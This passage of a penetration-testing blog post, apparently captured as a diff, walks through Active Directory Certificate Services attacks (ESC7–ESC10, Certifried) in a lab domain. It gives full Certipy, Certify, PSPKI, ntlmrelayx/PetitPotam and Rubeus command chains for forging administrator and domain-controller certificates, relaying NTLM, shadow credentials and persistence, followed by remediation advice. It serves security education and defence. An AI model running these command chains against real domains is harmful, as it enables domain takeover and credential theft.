+<p>If a user has the <code class="language-plaintext highlighter-rouge">Manage CA</code> rights, he can remotely edit the <code class="language-plaintext highlighter-rouge">EDITF_ATTRIBUTESUBJECTALTNAME2</code> - aka <a href="#esc6">ESC6</a> - to be able to specify a SAN for <strong>ALL</strong> authentication templates afterwards.</p>
+
+<h4 id="pspki-1">PSPKI</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Get the current value of ``EDITF_ATTRIBUTESUBJECTALTNAME2``, modify it and check again
+$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "dc2016-2.mcafeelab.local"
+$configReader.SetRootNode($true)
+$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
+$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
+
+# Verify with certutil
+certutil.exe -config "CA.domain.local\CA" -getreg "policy\EditFlags"
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc7_exploit1.png" /></p>
+
+<p>You can now stick to <a href="#esc6">ESC6</a>.</p>
+
+<h4 id="certipy-8">Certipy</h4>
+
+<p>Certipy can be used in this scenario to give a user the <code class="language-plaintext highlighter-rouge">Issue and Manage Certificates</code> right.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -add-officer 'ds'
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc7_exploit2.png" /></p>
+
+<p><img src="/images/2022-09-16/esc7_exploit3.png" /></p>
+
+<p>If a user has the <code class="language-plaintext highlighter-rouge">Issue and Manage Certificates</code> rights, he is able to approve pending requests, which allows us to “bypass” the manager approval function.</p>
+
+<h4 id="certify-7">Certify</h4>
+
+<ul>
+  <li>Request a certificate that requires manager approval</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC7" /altname:"god" /install
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc7_exploit4.png" /></p>
+
+<p>The request is pending, and we got an ID.</p>
+
+<ul>
+  <li>Approve the pending request with PSPKI</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-CertificationAuthority -ComputerName dc2016-2.mcafeelab.local | Get-PendingRequest -RequestID 731 | Approve-CertificateRequest
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc7_exploit5.png" /></p>
+
+<ul>
+  <li>Fetch the now approved cert</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Certify.exe download /ca:DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1 /id:731
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc7_exploit6.png" /></p>
+
+<ul>
+  <li>Copy togehter your RSA private key and the cert, and generate your pfx and pwn the world.</li>
+</ul>
+
+<h4 id="certipy-9">Certipy</h4>
+
+<ul>
+  <li>If not already availabe, enable the SubCA template (remember, this is the all purpose template). It should however be enabled by default.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -enable-template SubCA
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc7_exploit7.png" /></p>
+
+<ul>
+  <li>Try to request a cert based on the SubCA template which will obviously fail. Save the private key</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template subCA -upn administrator@mcafeelab.local
+</code></pre></div></div>
+
+<ul>
+  <li>Approve the request with our superpowers</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -issue-request 732
+</code></pre></div></div>
+
+<ul>
+  <li>Fetch the issued cert</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -retrieve 732
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc7_exploit8.png" /></p>
+
+<p><img src="/images/2022-09-16/tada_meme.png" /></p>
+
+<h2 id="esc8">ESC8</h2>
+
+<p>Yeah, this was the one that initially got the most attention, and found it’s implementation in several tools that automated exploitation like impacket.<br />
+It describes the fact that we can relay an authentication to the (default enabled and to be found at http://caserver/certsrv/) HTTP enrollment endpoint, and grab certs for the relayed identities in order to impersonate them.<br />
+Suddenly coercion was a big thing again, and with the rise of PetitPotam and Co. things got really ugly.</p>
+
+<h3 id="recon-5">Recon</h3>
+
+<h4 id="certify-8">Certify</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Certify.exe cas
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc8_recon1.png" /></p>
+
+<h4 id="certutil-1">Certutil</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -enrollmentserverurl -config "dc2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1"
+</code></pre></div></div>
+
+<h4 id="pspki-2">PSPKI</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-CertificationAuthority | select name,enroll* | fl
+</code></pre></div></div>
+
+<h3 id="exploitation-5">Exploitation</h3>
+
+<p>Coerce authentication (Dementor, Printerbug, Petitpotam, DFSCoerce, Coercer, …) or just wait. Relay with <a href="https://github.com/SecureAuthCorp/impacket">ntlmrelayx</a>.</p>
+
+<p><strong>Whatever you read, if you want to pwn a DC -&gt; specify the template <code class="language-plaintext highlighter-rouge">Domain Controller</code> Otherwise it wouldn’t work for me. Impacket uses the <code class="language-plaintext highlighter-rouge">Machine</code> template by default, and this can’t be used by a DC for authentication.</strong></p>
+
+<p><img src="/images/2022-09-16/onedoes_meme.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./ntlmrelayx.py -t "http://DC2016-2.mcafeelab.local/certsrv/certfnsh.asp" --adcs -smb2support --template "Domain Controller"
+python PetitPotam.py -u lowpriv -p low -d mcafeelab.local 10.55.0.30 10.55.0.1
+.\Rubeus.exe asktgt /user:dc2016$ /ptt /certificate:MIIRnQIBAzCCEWcGCSq&lt;snip&gt;
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc8_exploit1.png" /></p>
+
+<p><img src="/images/2022-09-16/esc8_exploit2.png" /></p>
+
+<p><img src="/images/2022-09-16/esc8_exploit3.png" /></p>
+
+<p>If you are lazy, you can try to use <a href="https://twitter.com/_batsec_">Batsec’s</a> <a href="https://github.com/bats3c/ADCSPwn">ADCSPwn</a>, which automates the whole thing.<br />
+<br /><br />
+<br />
+Now to the brainfuck part. I hoped that after the S4U stuff, I would have a nice and relaxing time, but I was wrong. 
+I will try to keep this as simple as possible, because I don’t get it either. You can try to follow me along for Certifried, ESC9 and ESC10.</p>
+
+<p><img src="/images/2022-09-16/understand_meme.png" /></p>
+
+<h2 id="certifried">Certifried</h2>
+
+<p><a href="https://twitter.com/ly4k_">Oliver</a> found another vulnerability in ADCS, which is widely known as <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">Certifried</a>. I higly recommend you to read his blog post, as it fully and understandable describes what exactly is happening.</p>
+
+<p>The vulnerability allowed a low priv user to privesc to domain admin in a default setup, and was patched by Microsoft with updates for CVE-2022–26923 in May 2022. You know that some admins hate patching, don’t you?</p>
+
+<p>By default, users can enroll in the <code class="language-plaintext highlighter-rouge">User</code> template, and computers in the <code class="language-plaintext highlighter-rouge">Machine</code> template, both allowing for client authentication.<br />
+The difference is, that the user certs are derived from the <code class="language-plaintext highlighter-rouge">UPN</code>, which a computer object does not have. Instead their certs will be derived from their <code class="language-plaintext highlighter-rouge">dNSHostName</code> property.<br />
+Now the tricky part:<br />
+When a user wants to authenticate via PKINIT, the KDC will lookup the UPN provided in the cert, and try to match it to a user. The UPN must be unique, so we can’t simply change the UPN of user A to the B@domain.com, if B already exists.
+When creating a computer account, the creator gets granted the <code class="language-plaintext highlighter-rouge">Validated write to DNS host name</code> permissions, which allows him to alter the <code class="language-plaintext highlighter-rouge">dNSHostName</code> property of the object, which needs to be <a href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name">“compliant with the computer name and domain name”</a>. This allows us to set the DNS name to something that doesn’t already exist, like test.mcafeelab.local.</p>
+
+<p><img src="/images/2022-09-16/certifried1.png" /></p>
+
+<p><img src="/images/2022-09-16/certifried2.png" /></p>
+
+<p>If we now request a cert as the computer, it will be issued for test.mcafeelab.local as the <code class="language-plaintext highlighter-rouge">dNSHostName</code> is used, as explained before.</p>
+
+<p><img src="/images/2022-09-16/certifried3.png" /></p>
+
+<p>The fun thing now is, that in contrast to the <code class="language-plaintext highlighter-rouge">UPN</code>, the <code class="language-plaintext highlighter-rouge">dNSHostName</code> doesn’t need to be unique :)<br />
+But you can’t simply swap your DNS name to dc2016.mcafeelab.local, as this again raises an error because when we update the value, AD automatically wants to also update the <code class="language-plaintext highlighter-rouge">SPN</code> of the object, which again needs to be unique:</p>
+
+<p><img src="/images/2022-09-16/certifried4.png" /></p>
+
+<p>Lucky for us, a creator of a computer object also has the <code class="language-plaintext highlighter-rouge">Validated write to service principal name</code> rights, so we can alter them as well.<br />
+As can be seen in the picture above, only the values for the SPNs with the FQDN changed. The ones that don’t, still have like <code class="language-plaintext highlighter-rouge">HOST/WIN10X64</code> (without a $ at the end), not reflecting the changes to <code class="language-plaintext highlighter-rouge">test.mcafeelab.local</code>. If we delete the FQDN entries of our computer, we can alter the DNS property to our liking:</p>
+
+<p>Before<br />
+<img src="/images/2022-09-16/certifried5.png" /></p>
+
+<p>After altering we can set the DNS name without an error and request a cert with the new name</p>
+
+<p><img src="/images/2022-09-16/certifried6.png" /></p>
+
+<p><img src="/images/2022-09-16/certifried7.png" /></p>
+
+<p><img src="/images/2022-09-16/certifried8.png" /></p>
+
+<p>We can finally authenticate as the DC and fetch the NT hash for PTH or whatever:</p>
+
+<p><img src="/images/2022-09-16/certifried9.png" /></p>
+
+<p>As we can see, the cert was issued to <code class="language-plaintext highlighter-rouge">DC2016$@mcafeelab.local</code> - name + <code class="language-plaintext highlighter-rouge">$</code>. This is because the mapping of the cert to an account first tries to match the principal name in the AS-REQ package. If not found, the SAN, UPN or DNS name are the next reference for a match. During PKINIT auth the trailing <code class="language-plaintext highlighter-rouge">$</code> from the principal name is stripped and the name matched to the <code class="language-plaintext highlighter-rouge">SAMAccountName</code> with a traling <code class="language-plaintext highlighter-rouge">$</code>. Please read the <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">PKINIT &amp; Certificate Mapping</a> part of Oliver’s research to fully dig it.</p>
+
+<p>To fix the Certifried attack vector, Microsoft implemented some countermeasures. One of them is a new security extension called <code class="language-plaintext highlighter-rouge">szOID_NTDS_CA_SECURITY_EXT</code> which embeds the <code class="language-plaintext highlighter-rouge">objectSid</code> of the requester into the cert.<br />
+Additionally MS added 2 reg keys:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel CertificateMappingMethods 
+and
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">CertificateMappingMethods</code> setting describes how <code class="language-plaintext highlighter-rouge">Schannel</code> (instead of Kerberos) handles authentication.</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> is set to 0, no strong mapping checks are performed and the new <code class="language-plaintext highlighter-rouge">szOID_NTDS_CA_SECURITY_EXT</code> extension is ignored globally.<br />
+The newly introduced “features” of MS caused a lot of trouble, so admins were advised to revert the changes by setting the regkeys back to 0.</p>
+
+<h2 id="esc9">ESC9</h2>
+
+<p>If you want to fully understand, please read Oliver’s <a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">research</a>.</p>
+
+<p>The main part is this that certs get mapped in a certain way:</p>
+
+<blockquote>
+  <p>If the certificate contains a UPN with the value john@corp.local, the KDC will first try to see if there exists a user with a userPrincipalName property value that matches. If not, it checks if the domain part corp.local matches the Active Directory domain. If there is no domain part in the UPN SAN, i.e. the UPN is just john, then no validation is performed. Next, it will try to map the user part john to an account where the sAMAccountName property matches. If this also fails, it will try to add a $ to the end of the user part, i.e. john$, and try the previous step again (sAMAccountName). This means that a certificate with a UPN value can actually be mapped to a machine account.</p>
+</blockquote>
+
+<blockquote>
+  <p>If the certificate contains a DNS SAN and not a UPN SAN, then the KDC will split the DNS name into a user part and a domain part, i.e. johnpc.corp.local becomes johnpc and corp.local. The domain part is then validated to match the Active Directory domain, and the user part will be appended by a $ and then mapped to an account where the sAMAccountName property matches, i.e. johnpc will be looked up as johnpc$.</p>
+</blockquote>
+
+<h3 id="recon-6">Recon</h3>
+
+<p>There is a new <code class="language-plaintext highlighter-rouge">msPKI-Enrollment-Flag</code> available:  <code class="language-plaintext highlighter-rouge">CT_FLAG_NO_SECURITY_EXTENSION (0x80000)</code>. This allows to disable the <code class="language-plaintext highlighter-rouge">szOID_NTDS_CA_SECURITY_EXT</code> extension for a single template.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil -dstemplate ESC9 msPKI-Enrollment-Flag
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/esc9_recon1.png" /></p>
+
+<p>ESC9 is only useful when <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> is set to 1 = KDC checks if there is strong cert mapping applied to the cert. If yes it grants access. If not it checks if the cert contains the new SID extension and validates it. If check ok access is granted, otherwise declined. If the extension is completely missing, access is granted if the account requesting the cert is older than the cert.</p>
+
+<p>If the affected cert template additionally allows for client authentication and we have <code class="language-plaintext highlighter-rouge">GenericWrite</code> over another account, we can carry out the attack.</p>
+
+<p><img src="/images/2022-09-16/ESC9_1.png" /></p>
+
+<h3 id="exploitation-6">Exploitation</h3>
+
+<p>We first obtain the hash of the user we have <code class="language-plaintext highlighter-rouge">GenericWrite</code> rights for, in this case with the Shadow Credentials attack:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy shadow auto -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -account ds
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC9_2.png" /></p>
+
+<p>Now we change the UPN of <code class="language-plaintext highlighter-rouge">ds</code> to be <code class="language-plaintext highlighter-rouge">Administrator</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -user ds -upn Administrator
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC9_3.png" /></p>
+
+<p><img src="/images/2022-09-16/ESC9_4.png" /></p>
+
+<p>Next we need to request a TGT as the <code class="language-plaintext highlighter-rouge">ds</code> user, which will give us a TGT with Administrator as <code class="language-plaintext highlighter-rouge">UPN</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u 'ds@mcafeelab.local' -hashes a690...7931 -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template ESC9
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC9_5.png" /></p>
+
+<p>Now we need to revert the <code class="language-plaintext highlighter-rouge">UPN</code> settings on the <code class="language-plaintext highlighter-rouge">ds</code> account back to it’s default value:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -user ds -upn ds@mcafeelab.local
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC9_6.png" /></p>
+
+<p><img src="/images/2022-09-16/ESC9_7.png" /></p>
+
+<p>Lastly we can now request a TGT with our ticket which has the <code class="language-plaintext highlighter-rouge">Administrator UPN</code>, which will resolve to the <code class="language-plaintext highlighter-rouge">Administrator@mcafeelab.local</code> acount now:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -domain mcafeelab.local
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC9_8.png" /></p>
+
+<h2 id="esc10">ESC10</h2>
+
+<p>So the last one in the list talks about the case when the global parameter <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> = 0 - so all templates are ignoring the <code class="language-plaintext highlighter-rouge">szOID_NTDS_CA_SECURITY_EXT</code> setting.<br />
+The other prerequisit again is, that we have <code class="language-plaintext highlighter-rouge">GenericWrite</code> over another account.</p>
+
+<h3 id="recon-7">Recon</h3>
+
+<p>Query the accordings registry key locally or remotely.<br />
+<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement</code></p>
+
+<h3 id="exploitation-7">Exploitation</h3>
+
+<p>These are the same steps as in <a href="#esc9">ESC9</a>, with the addition, that we can enroll in <strong>ANY</strong> cert that has <code class="language-plaintext highlighter-rouge">Client Authentication</code> enabled.</p>
+
+<p>But wait there is more…<br />
+<img src="/images/2022-09-16/more_meme.png" /></p>
+
+<p>There is a 2nd scenario when Schannel is used instead of Kerberos, with a slight difference. This time instead of the <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> being disabled, we have the <code class="language-plaintext highlighter-rouge">CertificateMappingMethods</code> containing the <code class="language-plaintext highlighter-rouge">UPN</code> bit flag of <code class="language-plaintext highlighter-rouge">0x4</code> - SAN certificate mapping.<br />
+This is the equivalent to the <code class="language-plaintext highlighter-rouge">szOID_NTDS_CA_SECURITY_EXT</code> extension for Kerberos, which can’t be applied to <code class="language-plaintext highlighter-rouge">Schannel</code>.<br />
+Again, if you need more info, please read Oliver’s research, especially the <code class="language-plaintext highlighter-rouge">Schannel Certificate Mapping</code> part.</p>
+
+<p>We again need an account with <code class="language-plaintext highlighter-rouge">GenericWrite</code> over another account, this time one that doesn’t have an <code class="language-plaintext highlighter-rouge">UPN</code> - which is all machine accounts and the built in Administrator.<br />
+We’ll use the same two account from the example before.</p>
+
+<h3 id="recon-8">Recon</h3>
+
+<p>Query the accordings registry key locally or remotely.<br />
+<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods</code></p>
+
+<h3 id="exploitation-8">Exploitation</h3>
+
+<p>First we need the NT hash of our attacked user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy shadow auto -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -account ds
+</code></pre></div></div>
+
+<p>Then we change the <code class="language-plaintext highlighter-rouge">UPN</code> of the <code class="language-plaintext highlighter-rouge">ds</code> user to <code class="language-plaintext highlighter-rouge">DC2016$.mcafeelab.local</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -user ds -upn 'DC2016$@mcafeelab.local'
+</code></pre></div></div>
+
+<p>No we enroll into any cert that allows client auth as <code class="language-plaintext highlighter-rouge">ds</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u 'ds@mcafeelab.local' -hashes a69...931 -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template User
+</code></pre></div></div>
+
+<p>Change back the <code class="language-plaintext highlighter-rouge">UPN</code> to the default value:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -user ds -upn 'ds@mcafeelab.local' 
+</code></pre></div></div>
+
+<p>And lastly jump into an ldap shell via <code class="language-plaintext highlighter-rouge">Schannel</code> and do some RBCD fun:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth -pfx 'dc2016.pfx' -dc-ip '10.55.0.2' -ldap-shell
+set_rbcd DC2016$ evil123$
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC10_1.png" /></p>
+
+<h2 id="bonus">Bonus</h2>
+
+<h3 id="persistence">Persistence</h3>
+
+<p>The cool thing about certs is that by default they have a lifetime of 1 year. So no matter how often changed or how complex a password is, the cert will always grant you access to a TGT and / or the current NT hash. Just request a cert with the NT hash or password and enjoy longtime access:</p>
+
+<p><img src="/images/2022-09-16/extra.png" /></p>
+
+<p>https://twitter.com/theluemmel/status/1572478359619211266</p>
+
+<h1 id="remediation">Remediation</h1>
+
+<p>Generally speaking, check your PKI infrastructure and use the tools and tips provided. Update regularly. Challenge regularly.</p>
+
+<p>ESC1: When you really need to have the enrolee supply the SAN, at least activate <code class="language-plaintext highlighter-rouge">Manager Approval</code> or restrict the users who can enroll. Better turn it off completely.<br />
+ESC2: If you need those cert templates, make use of the <code class="language-plaintext highlighter-rouge">Manager Approval</code> or restrict the users who can enroll. <br />
+ESC3: Restrict the users who can enroll. Restrict users who can become EnrollemntAgents.<br />
+ESC4: Review the ACLs on the templates and remove unneccessary access rights.<br />
+ESC5: Review all other ACLs in your PKI and restrict as much as possible<br />
+ESC6: Apply patch for CVE-2022–26923<br />
+ESC7: Review ACLs on the PKI itself and remove unwanted access rights<br />
+ESC8: Enable HTTPS on your enrollment endpoint and disable NTLM auth or remove it completely.<br />
+Certifried: Apply patch for CVE-2022–26923<br />
+ESC9: Set <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> = 2 and/or remove the <code class="language-plaintext highlighter-rouge">msPKI-Enrollment-Flag</code> from the affected template -&gt; <code class="language-plaintext highlighter-rouge">certutil -dstemplate ESC9 msPKI-Enrollment-Flag -0x00080000</code>  <br />
+ESC10: Remove the 0x4 bit from the <code class="language-plaintext highlighter-rouge">CertificateMappingMethods</code> setting in the registry</p>
+
+<h1 id="resources--credits">Resources &amp; Credits</h1>
+
+<p>Thx to <a href="https://twitter.com/harmj0y">Will Schroeder</a>, <a href="https://twitter.com/tifkin_">Lee Christensen</a> and <a href="https://twitter.com/ly4k_">Oliver Lyak</a> for their research, tools and sharing of information regarding ADCS vulns.<br />
+I also want to give a huge shout out to <a href="https://twitter.com/_nwodtuhs">Charly Bromberg</a> and <a href="https://twitter.com/snovvcrash">snovvcrash</a>, who do such outstanding jobs with the <a href="https://www.thehacker.recipes/ad/movement/ad-cs">Hacker Recipes</a> and <a href="https://ppn.snovvcrash.rocks/">snovvcrash.rocks</a>. Everything is documented step by step, reduced to the absolut minimum you need to pwn and understand things.<br />
+Thx to all the others I forgot to mention, but which’s info, tools and writeups I used. I love you guys.</p>
+
+<h2 id="all-the-stuff-i-used-for-my-research-in-absolutely-chaotic-order">All the stuff I used for my “research” in absolutely chaotic order:</h2>
+
+<p>https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc1<br />
+https://github.com/GhostPack/Certify<br />
+https://github.com/ly4k/Certipy<br />
+https://www.thehacker.recipes/ad/movement/ad-cs<br />
+https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate<br />
+https://www.thehacker.recipes/ad/movement/ad-cs#attack-paths<br />
+https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf<br />
+https://posts.specterops.io/certified-pre-owned-d95910965cd2<br />
+ESC4: https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates<br />
+https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7<br />
+https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4<br />
+https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services<br />
+https://github.com/bats3c/ADCSPwn<br />
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate<br />
+https://www.powershellgallery.com/packages/PSPKI/3.7.2<br />
+https://www.pkisolutions.com/tools/pspki/<br />
+https://blog.netwrix.com/2021/08/24/active-directory-certificate-services-risky-settings-and-how-to-remediate-them/<br />
+https://www.thehacker.recipes/ad/movement/ad-cs/certifried<br />
+https://www.gradenegger.eu/?p=18373</p>
+:ET
